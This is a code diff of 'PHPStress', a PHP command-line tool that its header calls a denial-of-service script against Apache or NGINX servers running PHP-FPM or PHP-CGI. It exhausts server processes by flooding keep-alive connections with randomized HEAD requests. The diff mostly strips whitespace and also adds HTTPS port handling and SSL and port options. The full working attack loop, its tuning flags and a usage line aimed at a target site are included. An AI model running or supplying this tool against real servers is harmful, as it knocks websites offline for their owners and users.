@@ -7,30 +7,30 @@ Written by: d4rk0  / @d4rk0s
 Concept by: Vinny Troia / @VinnyTroia
 Night Lion Security (http://www.nightlionsecurity.com)
 ---------------------------------------------------------------------
-Description: 
-    This is a light-weight low-bandwidth required PHP script that creates 
+Description:
+    This is a light-weight low-bandwidth required PHP script that creates
     a type of denial of service on a Linux-based Apache or NGINX web server
-    that process PHP content with PHP-CGI (fcgid) or PHP-FPM (Apache or NGINX). 
-    The script will create a number of fake PHP connections, causing the server 
-    to quickly launch additional processes to meet the new demand. In addition, 
+    that process PHP content with PHP-CGI (fcgid) or PHP-FPM (Apache or NGINX).
+    The script will create a number of fake PHP connections, causing the server
+    to quickly launch additional processes to meet the new demand. In addition,
     the server's connections are kept open (via keep-alive), causing the server
-    to quickly run out of resources. 
+    to quickly run out of resources.
 
     In order to completely max out the server's
-    resources, the script's delay parms need to both be set to 0. 
+    resources, the script's delay parms need to both be set to 0.
 
-    For more information, please view the complete post at 
+    For more information, please view the complete post at
     http://www.nightlionsecurity.com/blog/
 ----------------------------------------------------------------------
 Disclaimer:
-    Don't be a dick. 
+    Don't be a dick.
 ----------------------------------------------------------------------
 Usage:
     php phpstress.php http://www.target.com/?r=%r% -m 1000000000 -k Y -c 150 -d 0.5 -r 0.01
 
     OR
 
-    php phpstress.php www.target.com/wp-content/?r=%r% 
+    php phpstress.php www.target.com/wp-content/?r=%r%
 
     Socks Proxy: * NOT IN ALPHA VERSION
     -s = Y or N / 127.0.0.1:9050 Username:Pw
@@ -38,22 +38,22 @@ Usage:
            Edit the phpstress.socks file if you want to use a socks proxy
 ----------------------------------------
 Commands:
-	Target URL picking a resource intense page and inserting %r where the GET variables data is will generate random chars 
-  
+	Target URL picking a resource intense page and inserting %r where the GET variables data is will generate random chars
+
     -m  = Maximum requests not specifying this will leave it at a large default number to exit script on
           *nix flavored simply press control c to kill the program and exit or whatever TTY command you have setup
           to exit a program on command line
            Default value is 1000000000
 
     -k  = Y or N  Keep Alive Check will check if Server uses the Keep-Alive Option to keep the connection alive
-           Default value is Y            
+           Default value is Y
 
     -c = Maximum Request Per Connection each connection opened will then request D number of times
            Default value of 150
-    
+
     -d = Delay Between Connections The number of seconds to delay between opening a new connection.
            Default value: 0.5
-   
+
     -r = Delay Between Requests The number of seconds to delay between outgoing requests.
            Default value: 0.04
 
@@ -92,7 +92,7 @@ function userAgentRand(){
 "Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre");
 
 
-  // Lets shuffle our array 
+  // Lets shuffle our array
   shuffle($userArray);
   // count how many user agents in array
   $count = count($userArray);
@@ -102,8 +102,6 @@ function userAgentRand(){
   return $userArray[$count];
 
 }
-
-
 
 
 /*
@@ -129,10 +127,8 @@ function quick_rand(){
 */
 function parseUrl($target_url){
 
-
-
   $t = "";
-  $t = strpos($target_url,'http://');
+  $t = strpos($target_url,'http');
   if ($t === false) {
     $target_url = "http://". $target_url;
   }
@@ -152,8 +148,11 @@ function parseUrl($target_url){
 
   if(!$target_url['port']){
     $target_url['port'] = 80;
+    if($target_url['scheme']=="https"){
+      $target_url['port'] = 443;
+    }
   }
-  
+
   if ($target_url['scheme']){
     // return Parsed Array for Deployment and usage
     return $target_url;
@@ -162,8 +161,6 @@ function parseUrl($target_url){
     $target_url['host'] = "http://". $target_url['host'];
     return $target_url;
   }
-
-
 }
 
 
@@ -191,9 +188,9 @@ function checkQuery($target_url){
  RETURN: return 1=browser or 0=command line
 */
 function checkCommandLine(){
-  if(defined('STDIN')){ 
+  if(defined('STDIN')){
    $num = 0;
-  }else{ 
+  }else{
     $num = 1;
   }
   return $num;
@@ -204,7 +201,7 @@ function checkCommandLine(){
 /*
  Check if the remote host supports Keep-Alive
  PARAM: parsed target URL
- RETURN: either keep-alive or server doesn't support keep alive string 
+ RETURN: either keep-alive or server doesn't support keep alive string
 */
 function keepAlive($target_url){
 
@@ -223,8 +220,8 @@ function keepAlive($target_url){
   // lets build payload for keep-alive check
   $request = "HEAD / HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".
   $useragent."\r\nConnection: Keep-Alive\r\n\r\n";
-  
-  
+
+
   fwrite($socket, $request);
   $reply = "";
   // loop until end of buffer and socket stream
@@ -243,7 +240,7 @@ function keepAlive($target_url){
   //Check if the reply to our above request includes 'Connection: close
   if(strpos($reply, "Connection: close")){
    return "NO:KEEP-ALIVE";
-  }else{ return "KEEP-ALIVE"; }   
+  }else{ return "KEEP-ALIVE"; }
 
 
 }
@@ -261,7 +258,7 @@ function sendphpstress($target_url,$request_url,$mr,$mpc,$dbr,$dbc){
 
   echo "[!] To exit press control C or whatever TTY options are set to exit command line program\n\n\n";
   // lets loop through connections
-  for($c=0;$c<$max_connections;$c++){ 
+  for($c=0;$c<$max_connections;$c++){
 
     echo "Opening connection [".($c+1)."] to ".$target_url['host']."..";
     @$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $error, 3);
@@ -282,13 +279,13 @@ function sendphpstress($target_url,$request_url,$mr,$mpc,$dbr,$dbc){
         // build payload for attack
         $request = "HEAD ".str_replace("%r%", quick_rand(), $request_url)." HTTP/1.1\r\nHOST: ".$target_url['host']."\r\nUser-Agent: ".$useragent."\r\nConnection: Keep-Alive\r\n\r\n";
 
-        // write socket and make connection        
+        // write socket and make connection
         @fwrite($attack_socket, $request);
 
         echo ".";
 
         // Delay between requests 1 second requests
-        usleep($dbr * 1000000); 
+        usleep($dbr * 1000000);
 
       }
 
@@ -297,7 +294,7 @@ function sendphpstress($target_url,$request_url,$mr,$mpc,$dbr,$dbc){
   }
 
   @fclose($attack_socket);
-  
+
   echo "Closed connection"."\n";
   // amount of time to delay between connections
   usleep($dbc * 1000000);
@@ -322,97 +319,112 @@ function inputCommand($commands){
   // count number of commands for loop
   $count = count($commands);
 
-  // loop through commands	
+  // loop through commands
   for ($d = 0; $d < $count; $d++){
     // lets build commands
     switch ($commands[$d]){
 
-      // Display help list of commands and exit 		
-      case "--help":	
-        return "HELP"; 
-      // Display help list of commands and exit         		 
-      case "-": 
+      // Display help list of commands and exit
+      case "--help":
         return "HELP";
-  
-      // socks proxy   				
-      case "-s":	
+      // Display help list of commands and exit
+      case "-":
+        return "HELP";
+
+      // socks proxy
+      case "-s":
         $outputCommand[] = "-s";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         break;
 
 
       // target
-      case "-t":			
+      case "-t":
         $outputCommand[] = "-t";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         // Grab Target ////////////////
         break;
-   
+
       // maximum requests
-      case "-m":			
+      case "-m":
         $outputCommand[] = "-m";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         // Grab Target ////////////////
         break;
 
       // keep alive yes or no
-      case "-k":			
+      case "-k":
         $outputCommand[] = "-k";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         break;
 
       // maximum request per connection
-      case "-c":			
+      case "-c":
         $outputCommand[] = "-c";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         break;
 
-      // delay between connections		
-      case "-d":			
+      // delay between connections
+      case "-d":
         $outputCommand[] = "-d";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         break;
 
       // delay between requests
-      case "-r":			
+      case "-r":
         $outputCommand[] = "-r";
         // Grab Type /////////////////
         $new_number = $d++;
         $value = $commands[$d];
-        $outputCommand[$new_number] = $value; // Append data to Array	
+        $outputCommand[$new_number] = $value; // Append data to Array
         break;
 
-         
- 		
+      // Use SSL
+      case "-S":
+        $outputCommand[] = "-S";
+        // Grab Type /////////////////
+        $new_number = $d++;
+        $value = $commands[$d];
+        $outputCommand[$new_number] = $value; // Append data to Array
+        break;
+
+      // Port for connection
+      case "-p":
+        $outputCommand[] = "-p";
+        // Grab Type /////////////////
+        $new_number = $d++;
+        $value = $commands[$d];
+        $outputCommand[$new_number] = $value; // Append data to Array
+        break;
     }
 
   }
 
   // return array with results
-  return $outputCommand; 
+  return $outputCommand;
 
 
 
 }
-  
+
 /*
  Check if we are on command line or not
 PARAM: NONE
@@ -432,33 +444,33 @@ function commandLineCheck(){
 /*
  Displays the Help menu showing all available program commands
 PARAM: NONE
-RETURN: NONE exits 
+RETURN: NONE exits
 */
 function displayHelp(){
-    echo "    
+    echo "
 PHPStress 1.0
 Usage: php phpstress.php [url] [options]
 
 OPTIONS:
--t: Target URL picking a resource intense page and inserting %r 
-    where the GET variables data is will generate random chars 
-		
--m: Maximum requests not specifying this will leave it at a large default number 
+-t: Target URL picking a resource intense page and inserting %r
+    where the GET variables data is will generate random chars
+
+-m: Maximum requests not specifying this will leave it at a large default number
     Default value is 1000000000
 
--k: Keep Alive Check will check if Server uses the Keep-Alive Option 
-    to keep the connection alive (Y or N)  
-    Default value is Y            
+-k: Keep Alive Check will check if Server uses the Keep-Alive Option
+    to keep the connection alive (Y or N)
+    Default value is Y
 
--c: Maximum Request Per Connection each connection opened will 
+-c: Maximum Request Per Connection each connection opened will
     then request D number of times
     Default value of 150
 
--d: Delay Between Connections - The number of seconds to delay 
+-d: Delay Between Connections - The number of seconds to delay
     between opening a new connection.
     Default value: 0.5
 
--r: Delay Between Requests The number of seconds to delay between 
+-r: Delay Between Requests The number of seconds to delay between
     outgoing requests
     Default value: 0.04 \n\n";
     exit(0);
@@ -499,8 +511,6 @@ if (isset($argv[1])) {
   $mpc = 150;
   $dbr = 0.02;
   $dbc = 0.7;
-  $ssl = false;
-  $port = 80;
 
 
   // lets assign all variables now and get ready for attack
@@ -513,20 +523,7 @@ if (isset($argv[1])) {
       $r++;}
       $socks = $results[$r];
     }
-    // Check if SSL
-    if ($com == "--ssl"){
-      $r = $key;
-      if ($r == 0){ $r++;$r++; }else{
-      $r++;}
-      $ssl = $results[$r];
-    }
-    // Port number for connection Default is 80
-    if ($com == "-p"){
-      $r = $key;
-      if ($r == 0){ $r++;$r++; }else{
-      $r++;}
-      $port = $results[$r];
-    }
+
     // Maximum requests Default is 100000000
     if ($com == "-m"){
       $r = $key;
@@ -575,60 +572,53 @@ if (isset($argv[1])) {
     exit(0);
   }
 
-  // SSL check now  
-  if ((strtolower($ssl) == "n") || (strtolower($ssl) == "y")){}else{
-    // error socks is either a n or y question 
-    echo "   [!]  ERROR: SSL is either a [y]es or [n]o question\n\n";
-    exit(0);
-  }
-
-  // Socks check now  
+  // Socks check now
   if ((strtolower($socks) == "n") || (strtolower($socks) == "y")){}else{
-    // error socks is either a n or y question 
+    // error socks is either a n or y question
     echo "   [!]  ERROR: Socks is either a [y]es or [n]o question\n\n";
     exit(0);
   }
 
-  // keep alive 
+  // keep alive
   if (strtolower($k) != "n" || strtolower($k) != "y"){}else{
-    // error socks is either a n or y question 
+    // error socks is either a n or y question
     echo "   [!]  ERROR: Keep Alive is either a [y]es or [n]o question\n";
     exit(0);
   }
 
   // Max request check now
   if ((is_numeric($mr)) || ($mr != "") || (!empty($mr))){}else{
-    // error max request is not a number 
+    // error max request is not a number
     echo "   [!]  ERROR: Max Request must be a valid number. Default is 100000000\n";
     exit(0);
-  }  
+  }
 
   // Max per connection
   if ((is_numeric($mpc)) || ($mpc != "") || (!empty($mpc))){}else{
-    // error max request is not a number 
+    // error max request is not a number
     echo "   [!]  ERROR: Max Request Per Connection is invalid. Default is 150\n";
     exit(0);
-  }  
+  }
 
   // Delay between request
   if ((is_numeric($dbr)) || ($dbr != "") || (!empty($dbr))){}else{
     // error
     echo "   [!]  ERROR: Delay between requests is invalid. Default is 0.04 seconds. \n";
     exit(0);
-  }  
+  }
 
   // Delay between connections
   if ((is_numeric($dbc)) || ($dbc != "") || (!empty($dbc))){}else{
-    // error 
+    // error
     echo "   [!]  ERROR: Delay between connections is invalid. Default is 0.5 seconds. \n";
     exit(0);
-  }  
+  }
 
 }else{
   // display help
   displayHelp();
   exit(0);
-} 
+}
 
 
 
